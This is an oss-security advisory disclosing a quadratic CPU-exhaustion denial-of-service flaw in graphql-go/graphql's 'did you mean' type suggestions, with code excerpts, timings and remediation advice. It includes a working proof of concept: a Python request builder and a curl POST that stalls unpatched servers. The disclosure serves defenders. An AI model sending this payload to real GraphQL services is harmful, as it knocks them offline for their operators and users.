X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/4
Message-ID: <CAK=gNzpN1UDdE2Ki9YPKa8vTzaXYy0xxVuJveKOAKQL=cQDwAQ@mail.gmail.com>
Date: Sat, 29 Aug 2026 18:48:43 +0200
From: William Carrier <0x6675636b736f6369617479@...il.com>
To: oss-security@...ts.openwall.com
Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS via full-schema "did you mean" suggestion scan
Content-Type: text/plain; charset=utf-8

Hello,

This reports an algorithmic-complexity denial-of-service defect in
github.com/graphql-go/graphql, affecting all released versions up to and
including the latest, v0.8.1. No fixed version exists. It is
unauthenticated, network-reachable, triggered purely by attacker-controlled
query text, and requires no special configuration. Reproduced against the
published v0.8.1 module fetched from the Go module proxy.

A CVE ID has been requested from MITRE and is pending.

== Affected ==

  Product:  github.com/graphql-go/graphql
  Versions: all <= v0.8.1; no fix available
  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)


== Details ==

When query validation encounters an unknown type name, KnownTypeNamesRule
(rules.go) builds a "Did you mean" suggestion by scanning the WHOLE schema:

    ttype := context.Schema().Type(typeNameValue)
    if ttype == nil {
        suggestedTypes := []string{}
        for key := range context.Schema().TypeMap() {   // every type in
the schema
            suggestedTypes = append(suggestedTypes, key)
        }
        reportError(context,
            unknownTypeMessage(typeNameValue, suggestionList(typeNameValue,
suggestedTypes)),
            ...)
    }

suggestionList calls lexicalDistance(input, opt) for every option.
lexicalDistance is a Levenshtein DP that allocates an (|a|+1) x (|b|+1)
matrix as a slice of slices:

    func lexicalDistance(a, b string) float64 {
        d := [][]float64{}
        ...                       // O(|a| * |b|) cells, each an append
into a slice
    }

So each unknown type name costs O(schema_types * name_length *
avg_type_name_len), and a request may contain many unknown type names (one
per query-variable type, per inline-fragment type condition, etc.). Total:
O(unknowns * schema_types * name_length) for a single request. The
magnitude scales with the number of types the target schema defines, any
real-world schema (dozens to hundreds of types) amplifies it substantially.

== Proof of concept ==

One POST declaring K query variables, each typed with a long unknown type
name:

    # build a request: query($v0: ZZZ...ZZZ, $v1: ZZZ...ZZZ, ...){ hello }
    #   K variables, each type name 2000 'Z' chars (an unknown type)
    python3 - "$K" <<'PY' > body.json
    import sys, json
    k = int(sys.argv[1]); name = "Z"*2000
    q = "query(" + ",".join("$v%d: %s" % (i, name) for i in range(k)) + "){
hello }"
    sys.stdout.write(json.dumps({"query": q}))
    PY
    curl -s -o /dev/null -w '%{time_total}\n' -X POST http://TARGET/graphql
\
         -H 'Content-Type: application/json' --data-binary @body.json

Measured over HTTP against v0.8.1, 300-type schema (linear ~0.3 s/KB):

    K=10   (19 KB)   -> 4.8 s
    K=20   (39 KB)   -> 9.8 s
    K=40   (78 KB)   -> 20.6 s
    K=80   (156 KB)  -> 48.6 s
    K=100  (~198 KB) -> ~55 s

(A schema with only a handful of types yields ~1 s at K=40; the cost grows
with
schema type count.)

== Impact ==

A single unauthenticated ~200 KB request consumes ~55 s of server CPU on a
realistic schema; a small number of concurrent such requests saturates the
worker pool and denies service. No authentication, no special configuration.

== Remediation ==

Skip suggestions when the input exceeds a small length, cap the number of
candidates and the lexicalDistance input length, and short-circuit the DP
when the distance cannot beat the current best (as graphql-js does).

== Credit ==

  William Carrier, independent security researcher.

Best,

